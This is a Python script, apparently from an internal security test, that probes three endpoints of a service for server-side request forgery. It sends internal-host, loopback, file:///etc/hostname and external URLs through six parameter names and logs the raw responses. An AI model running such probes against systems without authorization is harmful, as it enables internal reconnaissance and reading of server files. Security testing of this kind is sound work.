#!/usr/bin/env python3
# INT-r27-0014 SSRF matrix-test: faces(/fetch,/preview,/proxy) x params(url,target,uri,dest,host,path) x payloads(int,local,file,ext)
# raw socket -> byte-exact raw_request; no redirect following (raw HTTP); interval>=0.25s; 429->sleep 3.5 retry once
import socket, json, time, urllib.parse, sys

HOST, PORT = "svc-api-gw", 8002
TS = "2026-10-23T16:00:00Z"
FACES = ["/fetch", "/preview", "/proxy"]
PARAMS = ["url", "target", "uri", "dest", "host", "path"]
PAYLOADS = [
    ("int",   "http://svc-login:8004/"),
    ("local", "http://127.0.0.1:8002/"),
    ("file",  "file:///etc/hostname"),
    ("ext",   "http://example.com"),
]

def raw_req(qs, timeout=8.0):
    raw = "GET %s HTTP/1.1\r\nHost: %s:%d\r\n\r\n" % (qs, HOST, PORT)
    t0 = time.time()
    err = None
    buf = b""
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.sendall(raw.encode("latin1"))
        s.settimeout(timeout)
        hdr_done, clen, te = False, None, None
        while len(buf) < 262144:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
            if not hdr_done and b"\r\n\r\n" in buf:
                hdr_done = True
                head = buf.split(b"\r\n\r\n", 1)[0].decode("latin1")
                for ln in head.split("\r\n")[1:]:
                    if ":" in ln:
                        k, v = ln.split(":", 1)
                        kl = k.strip().lower()
                        if kl == "content-length":
                            clen = int(v.strip())
                        elif kl == "transfer-encoding":
                            te = v.strip().lower()
                if te is None and clen is not None and len(buf) >= buf.find(b"\r\n\r\n") + 4 + clen:
                    break
        s.close()
    except Exception as e:
        err = repr(e)
    head, _, body = buf.partition(b"\r\n\r\n")
    status, headers = None, {}
    lines = head.decode("latin1").split("\r\n")
    if lines and lines[0].startswith("HTTP/"):
        parts = lines[0].split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                headers[k.strip().lower()] = v.strip()
    excerpt = body[:500].decode("latin1")
    printable = "".join(ch if 32 <= ord(ch) < 127 else "." for ch in excerpt)
    return {
        "raw_request": raw, "status": status, "resp_headers": headers,
        "body_len": len(body), "body_excerpt": printable,
        "elapsed_s": round(time.time() - t0, 3), "error": err,
    }

results = []
seq = [0]

def run_qs(tag, face, param, pname, qs, value):
    seq[0] += 1
    rec = raw_req(qs)
    if rec["status"] == 429:
        time.sleep(3.5)
        rec = raw_req(qs)
        rec["retry_after_429"] = True
    rec.update({"seq": seq[0], "tag": tag, "ts": TS, "face": face, "param": param, "payload": pname, "qs": qs, "value": value})
    results.append(rec)
    print(json.dumps(rec, ensure_ascii=False), flush=True)
    time.sleep(0.26)

# controls: bare + empty url, per face
for f in FACES:
    run_qs("ctrl-bare", f, None, None, f, None)
    run_qs("ctrl-empty-url", f, "url", None, f + "?url=", "")
# matrix
for f in FACES:
    for p in PARAMS:
        for pname, pv in PAYLOADS:
            qs = "%s?%s=%s" % (f, p, urllib.parse.quote(pv, safe=""))
            run_qs("matrix", f, p, pname, qs, pv)

print("[SUMMARY] total_requests=%d faces=%d params=%d payloads=%d ts=%s" % (seq[0], len(FACES), len(PARAMS), len(PAYLOADS), TS), flush=True)
